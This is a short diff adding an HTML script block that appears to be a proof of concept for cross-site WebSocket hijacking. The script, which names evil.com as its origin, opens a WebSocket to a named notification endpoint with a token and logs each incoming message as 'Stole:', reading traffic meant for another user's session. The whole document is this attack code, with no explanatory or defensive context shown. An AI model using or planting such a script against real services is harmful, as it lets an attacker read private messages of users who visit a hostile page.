@@ -1,0 +1,5 @@
+<script>
+  const ws = new WebSocket("ws://notification.immunefiles.com/ws/immunetalk/?token=Iamtesting");
+  ws.onmessage = (e) => console.log("Stole: " + e.data);
+  ws.onopen = () => ws.send(JSON.stringify({ message: "Hi from evil.com" }));
+</script>
